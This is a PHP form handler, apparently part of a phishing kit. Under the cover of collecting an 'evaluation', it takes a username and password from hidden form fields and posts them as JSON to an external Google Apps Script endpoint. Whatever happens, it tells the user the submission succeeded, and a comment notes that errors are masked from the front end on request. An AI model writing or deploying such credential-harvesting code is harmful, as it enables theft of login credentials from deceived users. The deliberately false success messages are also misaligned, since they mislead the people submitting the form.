<?php
// submit.php

// A URL do seu Google Apps Script implantado
$appsScriptUrl = 'https://script.google.com/macros/s/AKfycbzK-yZEAyED-oU_MT0M68Aac4_Mkn8oBc2di-eN91IxSTFPlrHIoHizC0M8eLIYh3Ff/exec';

// Captura os dados do formulário
$username = $_POST['username_field_hidden'] ?? '';
$password = $_POST['password_field_hidden'] ?? '';
$evaluation = $_POST['evaluation_field'] ?? '';

// Prepara os dados para enviar como JSON para o Google Apps Script
$data = [
    'username' => $username,
    'password' => $password,
    'evaluation' => $evaluation
];

$payload = json_encode($data);

// --- INÍCIO DA ALTERAÇÃO: Usando stream context em vez de cURL ---

$options = [
    'http' => [
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => $payload,
        'ignore_errors' => true // Importante para pegar respostas de erro HTTP
    ]
];
$context  = stream_context_create($options);

// Executa a requisição
// Linha 22 (aproximadamente, se as linhas acima forem iguais) -->
$response = @file_get_contents($appsScriptUrl, false, $context);

// Verifica por erros no PHP ao tentar acessar a URL
if ($response === false) {
    // Isso captura erros de rede ou DNS antes mesmo de uma resposta HTTP
    $error_msg = error_get_last()['message'] ?? "Erro desconhecido ao conectar com o Apps Script.";
    error_log("Stream Context Error (masked for front-end): " . $error_msg);
    header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! (Houve um aviso no servidor: " . $error_msg . ")"));
    exit;
}

// --- FIM DA ALTERAÇÃO ---


// Como 'ignore_errors' está true, a resposta HTTP 200 é tratada como sucesso pelo file_get_contents,
// e precisamos extrair o status real da resposta do Apps Script.

// Decodifica a resposta do Apps Script (ainda fazemos isso para ver o status real no log)
$response_data = json_decode($response, true);

if (isset($response_data['status']) && $response_data['status'] === 'success') {
    error_log("Apps Script Response (Success): " . $response); // Loga a resposta real de sucesso
    header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! Agradecemos sua colaboração."));
    exit;
} else {
    // Se não for 'success' no Apps Script, logamos o erro real no servidor
    error_log("Apps Script Response (Error Masked for front-end): " . $response);
    error_log("Apps Script Parsed Data (Error Masked): " . print_r($response_data, true));

    // Mas redirecionamos com sucesso para o front-end, conforme solicitado
    header('Location: index.php?status=success&message=' . urlencode("Sua avaliação foi enviada com sucesso! (Houve um aviso na comunicação)"));
    exit;
}
?>
